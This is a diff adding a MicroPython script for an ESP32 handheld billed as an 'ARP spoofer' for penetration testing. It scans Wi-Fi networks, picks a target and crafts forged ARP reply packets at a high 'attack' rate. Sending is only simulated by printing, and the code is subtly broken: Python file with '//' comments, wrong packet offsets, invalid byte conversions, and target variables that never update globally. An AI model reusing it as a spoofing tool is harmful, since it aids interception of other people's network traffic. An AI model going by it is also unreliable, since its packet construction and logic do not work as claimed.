@@ -1,0 +1,160 @@
+//ARP Spoof by MrEchoFi- Md. Abu Naser Nayeem[Tanjib]-IOT project for penetration testing
+//This project's for educational porposes. 
+
+from machine import Pin, I2C, SoftI2C
+from u8g2 import U8G2_SSD1306_128X64_NONAME_F_HW_I2C
+import network
+import time
+import ubinascii
+
+# Pins configuration
+LED_PIN = 2  # Built-in LED on ESP32
+BUTTON_NEXT_PIN = 17
+BUTTON_PREV_PIN = 5
+BUTTON_SELECT_PIN = 18
+
+AUTH_PASSWORD = "ARP"
+OLED_ADDRESS = 0x3C  # I2C address for the OLED
+
+# Variables
+packetRate = 500  # Increased packet rate for more frequent attacks
+menuIndex = 0  # Track menu navigation
+toggle_status = False
+packetCount = 0  # Packet counter for ARP attack
+prevTime = 0
+
+# Wi-Fi networks
+ssidList = []
+macList = []
+ipList = []
+networkCount = 0
+selectedNetwork = -1
+
+# Target MAC and IP (dynamic selection)
+targetMAC = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
+targetIP = [192, 168, 1, 100]
+
+# ARP packet template
+arp_packet = bytearray([
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  # Destination MAC (Broadcast)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  # Source MAC (dummy MAC)
+    0x08, 0x06,  # Frame type (ARP)
+    0x00, 0x01,  # Hardware type (Ethernet)
+    0x08, 0x00,  # Protocol type (IPv4)
+    0x06, 0x04,  # Hardware size, protocol size
+    0x00, 0x02,  # Opcode (2 for reply)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  # Sender MAC (same as source MAC)
+    0xc0, 0xa8, 0x01, 0x01,  # Sender IP (dummy IP)
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  # Target MAC
+    0xc0, 0xa8, 0x01, 0x64  # Target IP
+])
+
+# Initialize OLED display
+i2c = SoftI2C(scl=Pin(22), sda=Pin(21))
+u8g2 = U8G2_SSD1306_128X64_NONAME_F_HW_I2C(i2c, reset=None)
+
+# Initialize buttons
+button_next = Pin(BUTTON_NEXT_PIN, Pin.IN, Pin.PULL_UP)
+button_prev = Pin(BUTTON_PREV_PIN, Pin.IN, Pin.PULL_UP)
+button_select = Pin(BUTTON_SELECT_PIN, Pin.IN, Pin.PULL_UP)
+
+# Wi-Fi setup
+wifi = network.WLAN(network.STA_IF)
+wifi.active(True)
+
+# Function definitions
+def scanWiFiNetworks():
+    global networkCount
+    global ssidList, macList, ipList
+
+    networks = wifi.scan()
+    networkCount = len(networks)
+    ssidList = []
+    macList = []
+    ipList = []
+
+    for i, net in enumerate(networks):
+        ssidList.append(net[0].decode('utf-8'))
+        macList.append(ubinascii.hexlify(net[1]).decode('utf-8'))
+        ipList.append("192.168.1." + str(100 + i))  # Dummy IPs for demonstration
+
+def updateARPDetails():
+    global arp_packet
+    # Update ARP packet with selected MAC and IP
+    for i in range(6):
+        arp_packet[i] = targetMAC[i]  # Destination MAC
+        arp_packet[22 + i] = targetMAC[i]  # Target MAC
+    arp_packet[28:32] = bytes(wifi.ifconfig()[0].split('.'))  # Sender IP
+    arp_packet[38:42] = bytes(targetIP)  # Target IP
+
+def sendARP():
+    global packetCount, prevTime
+    if toggle_status and (time.ticks_ms() - prevTime > (1000 // packetRate)):
+        prevTime = time.ticks_ms()
+        for _ in range(5):  # Send multiple ARP packets
+            # Simulate ARP transmission (Wi-Fi raw frames not supported in MicroPython)
+            print("Sending ARP packet:", ubinascii.hexlify(arp_packet))
+            time.sleep_ms(2)  # Short delay between packets
+        packetCount += 5
+
+def drawNetworkList():
+    u8g2.clear_buffer()
+    u8g2.set_font(u8g2.FONT_6X10)
+    u8g2.draw_str(10, 10, "[Select Network]")
+    displayCount = min(3, networkCount)
+
+    for i in range(displayCount):
+        listIndex = (menuIndex + i) % networkCount
+        displayText = "{} {} {}".format(ssidList[listIndex], macList[listIndex], ipList[listIndex])
+        if i == 0:
+            u8g2.draw_str(0, 25 + i * 12, "->> " + displayText)
+        else:
+            u8g2.draw_str(1, 25 + i * 12, displayText)
+    u8g2.send_buffer()
+
+def drawOLEDMenu():
+    u8g2.clear_buffer()
+    u8g2.set_font(u8g2.FONT_6X10)
+
+    if selectedNetwork == -1:
+        drawNetworkList()
+    else:
+        u8g2.draw_str(0, 10, "Mr.EchoFi ARP Spoofer")
+        u8g2.draw_str(1, 25, "Status: {}".format("ON" if toggle_status else "OFF"))
+        if toggle_status:
+            u8g2.draw_str(1, 40, "Packets Sent: {}".format(packetCount))
+    u8g2.send_buffer()
+
+def handleButtonPress():
+    global menuIndex, selectedNetwork, toggle_status, packetCount
+
+    if not button_next.value():
+        menuIndex = (menuIndex + 1) % (networkCount if selectedNetwork == -1 else 2)
+        time.sleep_ms(200)
+
+    if not button_prev.value():
+        menuIndex = (menuIndex - 1) % (networkCount if selectedNetwork == -1 else 2)
+        time.sleep_ms(200)
+
+    if not button_select.value():
+        if selectedNetwork == -1:
+            selectedNetwork = menuIndex
+            print("Selected Network:", ssidList[selectedNetwork])
+            # Update ARP details based on selected network
+            targetMAC = list(bytes.fromhex(macList[selectedNetwork]))
+            targetIP = list(map(int, ipList[selectedNetwork].split('.')))
+            updateARPDetails()
+        elif menuIndex == 1:
+            toggle_status = not toggle_status
+            if not toggle_status:
+                packetCount = 0
+        time.sleep_ms(200)
+
+# Main program
+scanWiFiNetworks()
+updateARPDetails()
+
+while True:
+    handleButtonPress()
+    drawOLEDMenu()
+    sendARP()
